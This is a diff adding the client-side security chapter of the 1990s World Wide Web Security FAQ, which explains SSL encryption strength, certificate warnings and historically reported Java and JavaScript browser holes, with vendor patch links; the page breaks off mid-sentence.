@@ -1,0 +1,2207 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html> <head>
+<title>WWW Security FAQ: Client Side Security</title>
+</head>
+
+<body bgcolor="#FFFFFF">
+
+<H1>
+<a href="https://www.w3.org/"><img src="i/w3c_home.gif" alt="[W3C]"
+   align="middle" HEIGHT=48 WIDTH=72 border=0></a>
+The World Wide Web Security FAQ</H1>
+
+<HR>
+
+<H2>DISCLAIMER</H2>
+
+This information is provided by Lincoln Stein (<A
+href="mailto:lstein@cshl.org">lstein@cshl.org</a>)
+and John Stewart (<a href="mailto:jns@digitalisland.net">jns@digitalisland.net</a>). The World Wide Web
+Consortium (W3C) hosts this document as a service to the Web Community;
+however, it does not endorse its contents. For further information,
+please contact Lincoln Stein or John Stewart directly.  <p>
+
+<table width="100%">
+<tr>
+  <td>
+  <td align="center"><A HREF="index.html#contents">
+      <img src="i/up.gif" align="middle" width=20 height=22 border=0 alt="^ "
+      >Up to <cite>Table of Contents</cite></A><br>
+  <td>
+<tr>
+  <td align=left>
+  <a HREF="wwwsf1.html">
+      <img src="i/left.gif" align="middle" width=20 height=22 border=0 alt="&lt;&lt; "
+      >Back to <cite>General Questions</cite></a><br>
+  <td>
+  <td align=right>  <a HREF="wwwsf3.html">Forward to <cite>Server Side Security</cite><img
+      src="i/right.gif" align="middle" width=20 height=22 border=0 alt=" &gt;&gt;"></a><br>
+</table>
+
+<HR>
+
+<H1><A NAME="clients">9. Client Side Security</A></H1>
+
+(Thanks to <A HREF="mailto:pearlman@rand.org">Laura Pearlman</A>,
+who contributed many of the Q&amp;A's in this section).
+
+<H2><A NAME="CLT-Q1">Q1: How do I turn off the "You are submitting the contents of a form
+insecurely" message in Netscape?  Should I worry about it?</A></H2>
+
+This message indicates that the contents of a form that you're
+submitting to a CGI script is not encrypted and could be intercepted.
+Right now you'll get this message whenever you submit a form to any
+non-Netscape server, since only the Netsite Commerce Server can handle
+encrypted forms.  You probably shouldn't send sensitive information
+such as credit card numbers via unencrypted forms (however if you're
+the type who reads his credit card number over cellular phones, an
+even more insecure means of communication, go right ahead!).
+
+<p>
+To turn this warning off, select Preferences from Netscape's Options
+menu, choose "Images and Security", and uncheck the checkbox labeled
+"Warn before submitting forms insecurely."
+
+<HR>
+
+<H2><A NAME="CLT-Q2">Q2:</A> How secure is the encryption used by SSL?</H2>
+
+SSL uses public-key encryption to exchange a session key between the
+client and server; this session key is used to encrypt the http
+transaction (both request and response).  Each transaction uses a
+different session key so that if someone manages to decrypt a
+transaction, that does not mean that they've found the server's secret
+key; if they want to decrypt another transaction, they'll need to
+spend as much time and effort on the second transaction as they did on
+the first.
+
+<p>
+
+Netscape servers and browsers do encryption using either a 40-bit
+secret key or a 128-bit secret key.  Many people feel that using a
+40-bit key is insecure because it's vulnerable to a "brute force"
+attack (trying each of the 2^40 possible keys until you find the one
+that decrypts the message).  This was in fact demonstrated in 1995
+when a French researcher used a network of workstations to crack a
+40-bit encrypted message in a little over a week.  It is thought that
+with specialized hardware, 40-bit messages can be cracked in minutes
+to hours.  Using a 128-bit key eliminates this problem because there
+are 2^128 instead of 2^40 possible keys.  To crack a message encrypted
+with such a key by brute force would take significantly longer than
+the age of the universe using conventional technology.  Unfortunately,
+many Netscape users have browsers that support only 40-bit secret
+keys.  This is because of legal restrictions on the encryption
+software that can be exported from the United States.
+
+<p>
+
+In Netscape versions 3.X and earlier you can tell what kind of
+encryption is in use for a particular document by looking at the
+"document" information" screen accessible from the file menu.  The
+little key in the lower left-hand corner of the Netscape window also
+indicates this information.  A solid key with three teeth means
+128-bit encryption, a solid key with two teeth means 40-bit
+encryption, and a broken key means no encryption.  Even if your
+browser supports 128-bit encryption, it may use 40-bit encryption when
+talking to older servers or to servers outside the U.S. and Canada.
+<p>
+
+In Netscape versions 4.X and higher, click on the "Security" button to
+determine whether the current page is encrypted, and, if so, what
+level of encryption is in use.
+
+<p>
+
+In Microsoft Internet Explorer, a solid padlock will appear on the
+bottom right of the screen when encryption is in use.  To determine
+whether 40-bit or 128-bit encryption is in effect, open the document
+information page using <cite>File-&gt;Properties</cite>.  This will
+indicate whether "weak" or "strong" encryption is in use.
+
+<h3>Chosen Ciphertext Attacks (June 1998)</h3>
+
+In June 1998 researchers at Bell Laboratories discovered a technically
+sophisticated attack on the PKCS#1 public key cryptography standard, a
+protocol used by the SSL protocol.  This attack allows the session key
+used to encrypt a single Web session to be discovered by an attacker
+by sending approximately one million carefully constructed messages to
+the Web server and observe its responses.  If the session key is
+successfully compromised, the attacker can then read the contents of a
+single Web session (the requested URL and the returned document, plus
+any information sent in cookies or fill-out forms).  Because the
+attack does not compromise the server's private key, the attack has to
+repeated for each session the attacker wants to read.  Although the
+attack requires many trials and may take a significant length of time
+to complete, it is far more efficient than brute-force guessing.
+
+<p>
+
+Because the attack requires many messages to be sent to the Web
+server, you may be able to detect it by noting an increase in CPU or
+memory usage, or unusually high network activity.  In addition,
+products based on the SSLEay library, such as C2Net's Stronghold
+product, will observe a sudden growth in the SSL error log by
+approximately 300 MB.
+
+<p>
+
+Any SSL-enabled Web server dated earlier than June 1998 should be
+considered vulnerable to this attack.  Patches are available for the
+following products:
+
+<dl>
+  <dt>C2Net Stronghold
+  <dd><a href="http://www.c2.net">http://www.c2.net</a>
+      <p>
+  <dt>Microsoft IIS, Microsoft Exchange
+  <dd><a
+      href="http://www.microsoft.com/security/bulletins/ms98-002.htm">http://www.microsoft.com/security/bulletins/ms98-002.htm</a>
+      <p>
+  <dt>Netscape Enterprise, Proxy, Messaging and Collabra Servers
+  <dd><a
+      href="http://help.netscape.com/products/server/ssldiscovery/index.html">http://help.netscape.com/products/server/ssldiscovery/index.html</a>
+      <p>
+  <dt>Open Market secure servers
+  <dd><a
+      href="http://www.openmarket.com/security">http://www.openmarket.com/security</a>
+      <p>
+  <dt>SSLeay Library
+  <dd><a href="http://www.ssleay.org/announce/">http://www.ssleay.org/announce/</a>
+</dl>
+
+More information on the problem can be found at the following sources:
+
+<ol>
+  <li>CERT (<a
+href="http://www.cert.org/advisories/CA-1998-07.html">http://www.cert.org/advisories/CA-1998-07.html</a>)
+  <li>Bell Labs (<a
+      href="http://www.bell-labs.com">http://www.bell-labs.com</a>) (pending)
+  <li>RSA Data Security (<a href="http://www.rsa.com/rsalabs/pubs/PKCS/">http://www.rsa.com/rsalabs/pubs/PKCS/</a>)
+</ol>
+
+<h3>Personal Certificates</h3>
+
+Since 1996, the <a href="http://www.versign.com">VeriSign
+corporation</a> has been offering "personal certificates" for use with
+Microsoft and Netscape browsers.  A personal certificate is a unique
+digital ID that can be used to identify you to a Web server and to
+other users.  With a personal certificate, you can send and receive
+encrypted e-mail messages using the S/MIME system, to verify the
+identity of the person who sent you an e-mail message, or prove your
+identity to a Web server.
+
+<p>
+
+Personal certificates not widely used on the Web.  Their major use is
+within corporate intranets, where the possession of a certificate is
+used to control access to confidential information on the corporate
+Web server.  However, many people think that personal certificates
+will be used in the not-so-distant future as legally binding
+electronic signatures in Internet-based financial and legal
+transactions.
+
+<p>
+
+How secure are personal certificates?  Personal certificates use
+public key cryptography to sign and authenticate signatures.  As
+described in the <a href="wwwsf5.html#Q10"> SSL Q&amp;A</a>, the
+security of public key cryptography depends entirely on the secrecy of
+the user's private key.  When you apply for a digital certificate, a
+private key is automatically generated for you and saved to the hard
+disk of your computer.  During this generation process, you are
+prompted for a password, which will be used to encrypt the private key
+before saving it to disk.  This precaution lowers the risk that the
+key will be intercepted if the computer is compromised either
+physically or over the network.
+
+<p>
+
+Unfortunately this scheme is not foolproof because the private key is
+only as secure as the software that manipulates it.  As described in
+the sections below, there are numerous known and potential security
+holes in browser software.  If one of these holes is exploited to
+install new software on your computer or to modify the browser itself,
+then it is possible for the software to recover the private key from
+memory after it has been decrypted.  Once your private key has been
+intercepted, it can be used to impersonate you: to gain access to Web
+sites, to send S/MIME messages in your name, or, at some point in the
+future, to sign binding legal documents.
+
+<p>
+
+In addition to the weaknesses of the software infrastructure, some
+security consultants have voiced particular concern about the security
+of the cipher system that Microsoft Internet Explorer uses to encrypt
+the private key.  The issues are obscure, controversial, and differ
+from version to version of IE.  Under some circumstances Internet
+Explorer can be persuaded to export the private keys using weak 40-bit
+encryption, a level of encryption that is known to be vulnerable to
+brute-force key guessing attacks.  In other cases, the private key is
+vulnerable to fast "dictionary" attacks.  Full details can be found in
+an article written by Peter Gutmann (<a
+href="mailto:pgut001@cs.auckland.ac.nz">pgut001@cs.auckland.ac.nz</a>
+):
+
+<blockquote>
+<a href="http://www.cs.auckland.ac.nz/~pgut001/pubs/breakms.txt">http://www.cs.auckland.ac.nz/~pgut001/pubs/breakms.txt</a>
+</blockquote>
+
+<h3>Cryptography and the Law</h3>
+
+<p>
+
+The use of cryptography is regulated by a complex web of national and
+international laws.  In some countries, such as the United States, it
+is legal to use strong cryptography but software that implements it
+cannot be exported.  In other countries, such as France, it is illegal
+to use strong cryptography at all.
+
+<p>
+
+The laws are changing rapidly.  As I was writing this update in
+December 1998, the 33 countries in the <a
+href="http://www.wassenaar.org/">Wassenaar Arrangement</a> had agreed
+to establish the same cryptography export controls as the United
+States.  However, it appears that free software, such as <a
+href="http://www.ssleay.org/announce/">SSLEAY</a>, is exempted from
+these restrictions.
+
+<p>
+
+Recently the United States loosened the export restrictions slightly,
+allowing Web browsers to be used for strong encryption when
+communicating with financial institutions or when an American-owned
+company overseas needs to browse its home office's Web site.
+Server certificates that allow for these specific exemptions can be
+obtained from VeriSign through its "step-up" program.
+
+<p>
+
+More information on the legalities and politics of cryptography can be
+found at <a href="http://www.freecrypto.org">The Free Crypto
+Website</a>.
+
+<HR>
+
+<H2><A NAME="CLT-Q3">Q3:</A> When I try to view a secure page, the
+browser complains that the site certificate doesn't match the server
+and asks me if I wish to continue.  Should I?</H2>
+
+The host name of the Web server is an unalterable part of the site
+certificate.  If the name of the host doesn't match the name on the
+certificate, the browser will notice this fact and alert you of the
+problem.  Sometimes this is merely an innocent server
+misconfiguration, but it can also be evidence that a server
+certificate has been stolen and is being used to fool you.  In most
+cases, it's best to abort the transmission.
+
+<p>
+
+You may occasionally see a similar message that warns you that the
+server's certificate has expired.  This may mean that the Webmaster
+hasn't renewed the site's certificate in a timely fashion, or may
+again indicate that the certificate has been stolen and is being
+misused.  Again, the safest course is to abort the transmission.
+
+<HR>
+
+<H2><A NAME="CLT-Q4">Q4: </A>When I try to view a secure page, the browser
+complains that it doesn't recognize the authority that signed its
+certificate and asks me if I want to continue.  Should I?</H2>
+
+Web browsers come with a preinstalled list of certifying authorities
+that they trust to vouchsafe the identity of Web sites.  A few years
+ago there was only one certifying authority, the VeriSign corporation,
+but now there are dozens.  You can view the certifying authorities
+that your browser trusts by:
+
+<ol>
+  <li>In Netscape Navigator 1.0-3.02, choosing <cite>Options-&gt;Security
+      Preferences-&gt;Site Certificates</cite>
+  <li>In Netscape Navigator 4.X, clicking the <cite>Security</cite> icon.
+  <li>In Internet
+      Explorer, choosing
+      <cite>View-&gt;Options-&gt;Security-&gt;Sites...</cite>
+</ol>
+
+The browser will display a scrolling list of CA certificates -- the
+master certificates that certifying authorities use to sign the
+certificates of individual Web sites.  Both the Netscape and Microsoft
+browsers allow you to view the contents of certificates, activate and
+deactivate them, install new certificates, and delete old ones.
+
+<p>
+
+When a Web site presents your browser with a certificate signed by
+some authority, the browser will look up the authority's signature in
+its predefined list.  If the browser finds the signature, it will
+allow the SSL connection to continue.  Otherwise it complains that it
+doesn't recognize the certifying authority.
+
+<p>
+
+When this happens, the options available to you depend on the browser
+you are using.  If you are using a Netscape browser, the software
+offers you the option of reviewing the site's certificate and the
+signature of the certifying authority.  If you decide to proceed, you
+can recognize the validity of the certificate, either for this one
+session, or for future sessions.  If you accept the certificate, it
+will be installed in the browser among the CA certificates, and the
+SSL connection will be completed.  Internet Explorer does not give you
+this option.  In order to connect to the site, you will need to obtain
+a copy of the certifying authority's certificate and install it.  This
+is discussed below.
+
+<p>
+
+Is it safe to accept a site certificate signed by an unknown
+certifying authority?  If you have an older browser, it is likely that
+the certifying authority is legitimate but entered the business after
+the browser software was released.  Another real possibility, however,
+is that the certificate is signed by a rogue CA -- there's nothing to
+prevent a site from obtaining public domain certificate software and
+creating its own signed certificates.  Never accept a site certificate
+blindly.  Review it first, and contact the certifying authority
+directly (by phone) if you have any questions as to its legitimacy.
+If you can't easily determine how to contact the certifying authority,
+chances are that it isn't legitimate.
+
+<p>
+
+It is possible to install new certifying authorities in the browser.
+You do this by opening a URL that points to the certifying authority's
+certificate.  The browser will present a warning dialog telling you
+that you are about to install a new CA certificate and giving you a
+chance to abort.  If you proceed, the certificate will be installed
+and the CA will appear on the list of trusted authorities.  All sites
+bearing certificates signed by this CA will now be trusted to initiate
+SSL connections.
+
+<p>
+
+Because of its security implications, you should be very careful
+before installing a new CA certificate.  Never accept a CA certificate
+unless you know exactly what you are doing and have <em>a priori</em>
+evidence that the CA is to be trusted.  For example, many companies
+are now establishing internal certifying authorities to sign the
+certificates of intranet servers. If your employer gives you a floppy
+disk with instructions for installing the certificate contained within
+it, you can feel pretty safe accepting the certificate. If, however,
+the CA installation dialog ever appears unexpectedly while you're
+browsing the Internet, be sure to cancel immediately and complain to
+the remote site's Webmaster.
+
+<hr>
+
+<H2><A NAME="CLT-Q5">Q5: How private are my requests for Web documents?</A></H2>
+
+Read <A HREF="#CLT-Q2">section (2)</A> above.  All requests for documents
+are logged by the
+Web server.  Although your name is not usually logged, your IP address
+and computer's host name usually is.  In addition, some servers also
+log the URL you were viewing (such as your home page) at the time you
+requested the new URL.  If the site is well administered, the record
+of your accesses will be used for statistics generation and debugging
+only.  However, some sites may leave the logs open for casual viewing
+by local users at the site or even use them to create mailing lists.
+
+<p>
+The contents of queries in forms submitted using the GET request
+appear in the server log files because the query is submitted as part
+of the URL.  However, when a query is submitted as a POST request
+(which is often the case when submitting a fill-out form), the data
+you submit doesn't get logged.  If you are concerned about the
+contents of a keyword search appearing in a public log somewhere,
+check whether the search script uses the GET or POST method.  The
+easiest technique is to try an innocuous query first.  If the contents
+of the query appear in the URL of the retrieved document, then they
+probably appear in the remote server's logs too.
+
+<p>
+Server/browser combinations that use data encryption, such as
+Netsite/Netscape, encrypt the URL request.  Furthermore the encrypted
+request, because it is submitted as a POST request, does not appear in
+the server logs.
+
+<hr>
+
+<h2><a name="CLT-Q6">Q6: What's the difference between Java and
+JavaScript?</a></h2>
+
+Despite the similarity in names, Java and JavaScript are two separate
+entities.  <a href="http://www.javasoft.com/">Java</a> is a language
+designed by Sun Microsystems.  Java scripts are precompiled into a
+compact form and stored on the server's side of the connection.  HTML
+documents refer to the mini-applications known as Java "applets" by
+incorporating &lt;APPLET&gt; tags.  Browsers that support the
+&lt;APPLET&gt; tag (Netscape Navigator 2.0, Microsoft Internet
+Explorer 3.0 and Sun's HotJava), download the compiled Java
+applications and execute them.
+
+<p>
+
+JavaScript is a series of extensions to the HTML language designed by
+the Netscape Corporation and understood by Netscape Navigator versions
+2.0 and higher, as well as by Microsoft Internet Explorer version 3.0
+and higher (where it is called "JScript").  It's an interpreted
+language designed for controlling the browser; it has the ability to
+open and close windows, manipulate form elements, adjust browser
+settings, and download and execute Java applets.
+
+<p>
+
+Although JavaScript has a similar syntax to Java, it is quite distinct in
+many ways.
+
+<HR>
+
+<h2><a name="CLT-Q7">Q7: Are there any known security holes in Java?</a></h2>
+
+Java scripts, because they execute on the browser's side of the
+connection instead of on the server's, move the security risk squarely
+from the server to the client.  Is there anything for the client to
+worry about?
+
+<p>
+
+Several failsafes are built into Java to prevent it from compromising
+the remote user's machine.  When running as applets, Java scripts are
+restricted with respect to what they are allowed to do by a "security
+manager" object.  The security manager does not ordinarily allow
+applets to execute arbitrary system commands, to load system libraries,
+or to open up system device drivers such as disk drives.  In addition,
+scripts are generally limited to reading and writing to files in a
+user-designated directory only (the HotJava browser allows you to
+set this directory, while Netscape disallows all file manipulation).
+<p>
+
+Applets are also limited in the network connections they can make:  An
+applet is only allowed to make a network connection back to the
+server from which it was downloaded.  This is important for reasons
+discussed below.
+
+<p>
+
+Finally, the security manager allows Java applets to read and write to
+the network, read and write to the local disk, but not both.  This
+limitation was created to reduce the risk of an Applet spying on the
+user's private documents and transmitting the information back to the
+server.  Since the Netscape implementation disables all local file
+manipulation anyway, this restriction is currently moot.
+
+<h3>Security holes</h3>
+
+Unfortunately in the short time since its release, a number of
+security holes have been found in Java caused by bugs in the
+implementation.  The most recent one was described in September of
+1998, in which a buffer overflow bug in some Windows 95/NT versions of
+the Java virtual machine can cause your computer to crash.  A
+demonstration, along with a listing of vulnerable verions, can be
+found at <a href="http://www.eyeone.no/KillerApp/KillerApp.htm">
+http://www.eyeone.no/KillerApp/KillerApp.htm</a>.
+
+<p>
+
+A variety of other bugs have been identified and fixed, and it is the
+author's personal opinion is that Java is a far better alternative
+than the other forms of active content, which provide little, if any
+security.
+
+<p>
+
+Some people, however, feel differently.  For example, Princeton
+computer scientist Edward Felten feels that there are fundamental
+problems with the design of the language itself. His 1996 paper
+<cite><a href="http://www.cs.princeton.edu/sip/pub/secure96.html">
+Java Security: From HotJava to Netscape and Beyond</a></cite>, which
+was published in the 1996 IEEE Symposium on Security and Privacy,
+concludes with the following sobering assessment:
+
+<blockquote>
+We conclude that the Java system in its current form cannot easily be
+made secure.  Significant redesign of the language, the bytecode
+format, and the runtime system appear to be necessary steps toward
+building a higher-assurance system.
+</blockquote>
+
+<p>
+
+If you are security conscious, you might wish to take the safest
+course and deactivate Java completely.  In Netscape Navigator
+2.0-3.02, you can do this by unchecking the "Java" option in
+<cite>Options-&gt;Network Preferences-&gt;Languages</cite>.  In
+Internet Explorer 3.02, uncheck "Enable Java Programs" in the
+<cite>View-&gt;Options-&gt;Security-&gt;Active Content</cite> window.
+
+<p>
+
+Deactivating Java is harder in the 4.0 versions of both Navigator and
+Internet Explorer.  In Netscape Navigator 4.0, select
+<cite>Edit-&gt;Preferences</cite> from the menu bar, then select the
+"Advanced" category.  Locate the "Enable Java" checkbox and deselect
+it.
+
+<p>
+
+In IE 4.0, select <cite>View-&gt;Internet Options-&gt;Security</cite>,
+select the Internet Zone, and select "Custom" settings.  Now press the
+"Settings..." button and scroll down to the Java settings.  Choose
+"Disable Java."
+
+<p>
+
+Below are some of the older security holes present in the Java
+implementations distributed with various versions of Netscape and
+Internet Explorer.
+
+<h3>Ability to Execute Arbitrary Machine Instructions</h3>
+
+On 22 March 1996, Drew Dean (<a href="mailto:ddean@CS.Princeton.EDU">
+ddean@CS.Princeton.EDU</a>) and Ed Felton (<a
+href="mailto:felten@CS.Princeton.EDU">felten@CS.Princeton.EDU</a>) of
+the Princeton Dept of Computer Science, announced that they had
+successfully exploited a bug in Java to create an applet that deletes a
+file on the user's local disk.  In this bug, a binary library file is
+first downloaded to the user's local disk using the Netscape caching
+mechanism.  The Java interpreter is then tricked into loading the file
+into memory and executing it.
+
+<p>
+
+This bug is present in versions 2.0 and 2.01 of Netscape.  It has been
+fixed in versions 2.02 and 3.0x.
+
+<p>
+
+More information on this bug can be found at
+
+<pre>
+   <a href="http://www.cs.princeton.edu/sip">http://www.cs.princeton.edu/sip</a>
+</pre>
+
+
+<h3>Vulnerability to Denial-of-Service Attacks </h3>
+
+Applets can hog system resources such as memory and CPU time.  This
+may happen as the result of a programmer error, or maliciously in
+order to slow down the computer system to the point of unusability.
+Applets running under the same browser are not protected from one
+another.  One applet can easily discover another's existence and
+interfere with it, raising the interesting spectre of one vendor's
+applet deliberately making a competitor's applet appear to behave
+erratically.
+
+<p>
+
+If an applet appears to be behaving improperly, closing the page from
+which it originated does not necessarily shut it down.  It may be
+necessary to shut off the browser entirely.
+
+<h3>Ability to Make Network Connections with Arbitrary Hosts</h3>
+
+Version 2.0 of Netscape Navigator contained another Java bug, this one
+involving the restriction on Applets from contacting arbitrary hosts.
+<strong>This bug has been fixed</strong> in version 2.01 of Netscape,
+and you should upgrade to a more current version if you haven't
+already.
+
+<p>
+
+Applets are supposed to be able to talk only to the server
+that they originated from.  However in early March 1996, Steve Gibbons
+(<a href="mailto:sgibbo@amexdns.amex-trs.com">
+mailto:sgibbo@amexdns.amex-trs.com</a>) and Drew Dean
+(<a href="mailto:ddean@CS.Princeton.EDU">ddean@CS.Princeton.EDU</a>)
+independently discovered holes in the implementation that allows Applets to
+make connections to any host on the Internet.  This is a serious
+problem: once downloaded to a user's machine, the applet
+can now attempt to make a connection to any machine on the user's
+local area network,
+<em>even if the LAN is protected by a firewall</em>.  Many LANs
+are set up so that local machines are trusted to access services
+that distant machines are not.  As a trivial example, an Applet
+could open up a connection to the organization's private news
+server, fetch recent postings to an internal newsgroup, and
+transmit them back to a foreign host.
+<p>
+
+Unix users who are familiar with the Berkeley
+<code>rsh</code>, <code>rlogin</code> and <code>rcp</code> commands
+will see that this bug represents a risk to systems that
+trust each other enough to allow commands to be executed remotely.
+This bug also makes it possible for Applets to collect detailed
+information on network topology and name services from behind
+a firewall.
+<p>
+
+This security hole involves Java's trusting use of the Domain Name
+System (DNS) to confirm that it is allowed to contact a particular
+host.  A malfeasant using his own DNS server can create a
+bogus DNS entry to fool the Java system into thinking that a
+script is allowed to talk to a host that it is not authorized to
+contact.
+
+<h3><a name="java_sm_hole">Ability to Bypass the Java Security Manager
+with Hand-Crafted Byte Code</a></h3>
+
+On March 5, 1997, an internal security audit at JavaSoft revealed a bug
+in the Java bytecode verifier.  In theory, this bug could be exploited
+to bypass the Java Security Manager and execute forbidden operations.
+No actual exploitations of this bug are known.  The bug is present in
+JDK 1.1, in Microsoft Internet Explorer versions 3.01 and earlier, and
+in Netscape Navigator 3.01 and earlier.  A patch has been made
+available to Java library licensees and should be appearing in more
+recent versions of these products.
+
+<p>
+More information about Java and security can be found
+at URL:
+<pre>
+  <a href="http://java.sun.com/sfaq/">http://java.sun.com/sfaq/</a>
+</pre>
+
+<HR>
+
+<h2><a name="CLT-Q8">Q8: Are there any known security holes in JavaScript?</a></h2>
+
+JavaScript has a more troubling history of security holes.  Unlike the
+Java holes, which potentially can change data on the user's disk,
+JavaScript holes generally involve infringements on the user's
+privacy.  Although many bugs have been closed, others keep popping up.
+The most recent bug was reported on October 16, 1997.
+
+<h3>Ability to Read Arbitrary Files on User's Machine (November
+1998)</h3>
+
+<p>
+
+A bug in the JavaScript implementation in Netscape Communicator 4.5
+and 4.04-4.05 allows a Web page to read arbitrary files from the user's
+machine and transmitted across the Internet.  Any file that can be
+read with the user's permissions is vulnerable, including the system
+password file.  The bug affects both Windows and Unix versions of
+Communicator.  Any HTML page can carry this exploit, including ones
+that are transmitted as an e-mail enclosure.  Internet Explorer has
+not been reported to be vulnerable.
+
+<h3>The "Cuartango" and "Son of Cuartango" Holes (November 1998)</h3>
+
+Microsoft Internet Explorer is also vulnerable to file theft via
+JavaScript.  Internet Explorer versions 4.0-4.01 and prerelease
+versions of IE 5.0 allow JavaScript programs to cut and paste text
+into file upload fields, thereby allowing a boobytrapped Web page or
+e-mail message to steal any file on the user's disk.  The original
+hole and its "son" are described in Juan Cuartango's pages at <a
+href="http://pages.whowhere.com/computers/cuartangojc/">http://pages.whowhere.com/computers/cuartangojc/</a>.
+ <p>
+
+See <a
+href="http://www.microsoft.com/security/bulletins/ms98-015.asp">
+http://www.microsoft.com/security/bulletins/ms98-015.asp</a> for
+Microsoft's description of the bug and a patch file to fix it.
+
+<h3>The Netscape "Cache Browsing Bug" (October 1998)</h3>
+
+<p>
+
+A hole in the Windows versions of Netscape Navigator 3.04, 4.07 and
+4.5 allows remote sites to read URLs from the browser cache, allowing
+them to intercept the list of sites recently visited by the user.
+This bug is described in a <a
+href="http://home.netscape.com/products/security/resources/bugs/jscachebrowsing.html">Netscape
+security note.</a> Mac OS and Unix versions are not affected.  No
+patch is currently available for these software versions.
+
+
+<h3>Ability to Intercept the User's E-Mail Address and Other
+Preferences (February 1998)</h3>
+
+Versions of Netscape Navigator 4.0 through 4.04 contain a security
+hole involving access of JavaScript programs to the browsers
+preferences settings.  The settings, which are stored in a file named
+<cite>preferences.js</cite> in the Netscape directory, include a
+variety of private information such as your e-mail address, the names
+of mailbox files, and the identity of your e-mail and news servers.
+In addition, in many cases the preferences file also stores your
+e-mail (POP) and FTP (publish) passwords.  To see what else is in this
+file, open it in a text editor and take a look.
+
+<p>
+
+The implications of this hole is that a JavaScript enabled page can
+open the preferences file and upload all information contained within
+it to a remote server.  This can be exploited to capture visitors'
+e-mail addresses and to gather information about the user's network
+configuration.  The worst risk is that the user's e-mail password will
+be disclosed.  Since the e-mail password is, in many cases, the same
+as the user's LAN login password, this exposes organizations to a
+potential route of attack.
+
+<p>
+
+All versions of Netscape Communicator through 4.04 are vulnerable.
+Netscape version 4.05 reportedly fixes the problem. Please <a
+href="http://www.netscape.com/">upgrade</a> at your earliest
+convenience.  Of course, deactivating JavaScript is also an effective
+solution, and protects you against other bugs that are likely to be
+lurking in the JavaScript system.
+
+<p>
+
+This bug was uncovered by French software consultant Fernand Portela.
+More information is available at his Web site at:
+
+<blockquote><pre>
+<a href="http://www.mygale.org/~nando">http://www.mygale.org/~nando</a>
+</pre></blockquote>
+
+
+<h3>Interception of Files on User's Local Machine (October 16,
+1997)</h3>
+
+Microsoft Internet Explorer 4.0 for Windows 95/NT is vulnerable to
+pages that allow the remote Web site operator to spy on the contents
+of any text, image or HTML file located on your machine, or any file
+located on a mounted file server.  Firewalls cannot protect against
+this attack, and the browser is vulnerable even when running in "High
+Security" mode.  The Macintosh versions of IE 4.0 are not affected,
+apparently.
+
+<p>
+
+The bug, discovered by German consultant Ralf Hueskes and known as the
+"Freiburg attack," involves the trick of using JavaScript to create an
+invisible frame 1x1 pixel wide.  While the unsuspecting user browses
+the remote site, a JavaScript program running in the invisible frame
+scans the user's local machine and file shares for files with
+well-known names, and may then upload them to any site on the
+Internet.  The bug does not allow JavaScript to modify or damage
+files.  Microsoft has issued a patch for this bug, available at:
+
+<blockquote><pre>
+<a href="http://www.microsoft.com/msdownload/ieplatform/ie4patch/ie4patch.htm">http://www.microsoft.com/msdownload/ieplatform/ie4patch/ie4patch.htm</a>
+</pre></blockquote>
+
+<p>
+
+More information on the bug can also be found at:
+
+<blockquote>
+<pre>
+<a href="http://www.jabadoo.de/press/ie4_us_old.html">http://www.jabadoo.de/press/ie4_us_old.html</a>
+</pre></blockquote>
+
+
+<h3>Ability to Monitor the User's Session (August 29, 1997)</h3>
+
+A group of related bugs allows JavaScript pages to monitor all pages
+the user visits during a session, capture the URLs of documents
+viewed, and transmit the information to a host somewhere on the
+Internet.  Some variants of the bug allow the malicious page to
+capture the contents of fill-out forms, cookies, and information about
+other elements on the page.  Information can be stolen even if the
+user is viewing "secure" pages encrypted with SSL, and users working
+behind corporate firewall systems are as vulnerable as those connected
+directly to the Internet.  The only risk is to the user's privacy,
+however.  Data and software located on the user's machine cannot be
+modified.
+
+<p>
+
+Most variants of the bug involve the ability of JavaScript pages to
+open up an invisible window.  Because the user can't see the window,
+she isn't aware that a JavaScript program continues to run even after
+leaving the page that launched the script.  Other variants of the bug
+open up a new browser window and entice the user into using the window
+for subsequent browsing.
+
+<p>
+
+Despite many attempts to quash this group of bugs, variants reappear
+at almost monthly intervals and go under such cute names as "the Bell
+labs bug," the "Singapore bug" and the "Santa Barbara bug."  There
+have been so many patches and releases, it's difficult to keep track.
+However the following browsers are known to be vulnerable:
+
+<ul>
+  <li>Microsoft Internet Explorer 3.01, Windows 95/NT
+  <li>Microsoft Internet Explorer 3.02, Windows 95/NT
+  <li>Microsoft Internet Explorer 4.0 Platform Preview, Windows 95/NT
+  <li>Netscape Navigator 3.0, 3.01, and 3.02, all platforms
+  <li>Netscape Communicator 4.0 and 4.01, all platforms
+  <li>Netscape Communicator 4.02, Windows 95/NT
+</ul>
+
+<p>
+
+More information on these bugs can be found at the locations listed
+below.  Check here for updates and code patches:
+
+<ul>
+  <li><a
+      href="ftp://info.cert.org/pub/cert_advisories/CA-97.20.javascript">a recent CERT
+      advisory</a>
+  <li><a href="http://www.microsoft.com/security/">Microsoft's
+      security pages</a>
+  <li><a
+      href="http://home.netscape.com/info/security-doc.html">Netscape's security pages</a>
+  <li>
+</ul>
+
+<h3>Information Leakage Across Frames (July 10, 1997)</h3>
+
+A related type of bug involves the leakage of information across
+browser frames.  To understand why this is a problem, consider two
+different sites sharing the same browser window, one in each frame.
+It would be obviously undesirable if a JavaScript program downloaded
+from an untrusted site could "spy" on the contents of a frame from
+another site, particularly if that frame contained confidential
+information.
+
+<p>
+
+JavaScript closes some of the holes but not others.  A JavaScript
+can't recover the URL of a document downloaded from another site, but
+it appears that it <strong>can</strong> steal a listing of the
+following document elements:
+
+<ul>
+  <li>URLs of all in-line images
+  <li>Other in-line image information, such as width and height
+  <li>URLs of all applets
+  <li>URLs of all ActiveX controls
+</ul>
+
+This means that if a JavaScript page can trick you into leaving a
+frame open, it can silently monitor your activity, recording the URLs
+of all in-line images in documents that you view.  Although it can't
+recover the URL of the document itself, this hardly matters.  The vast
+majority of images on the Web are local.
+
+<p>
+
+A demo of this exploit can be found at <a
+href="http://www.genome.wi.mit.edu/~lstein/crossframes">
+http://www.genome.wi.mit.edu/~lstein/crossframes</a>.  Although it
+only captures inline image information from a single document, be
+aware that it could catch <strong>all</strong> the image URLs you view
+and upload them to a server somewhere.
+
+<p>
+
+This bug affects Netscape Navigator 3.0, 3.01 and Netscape
+Communicator 4.01.  It is fixed in 4.02 and 3.03.  It does
+<em>not</em> affect Navigator 2.X or Internet Explorer.
+
+<h3>File Upload Hole (June 25, 1997)</h3>
+
+Although not strictly related to JavaScript, a bug in the way that
+fill-out forms are handled by Netscape Navigator allows JavaScript
+programs to trick the browser into uploading any local file on the
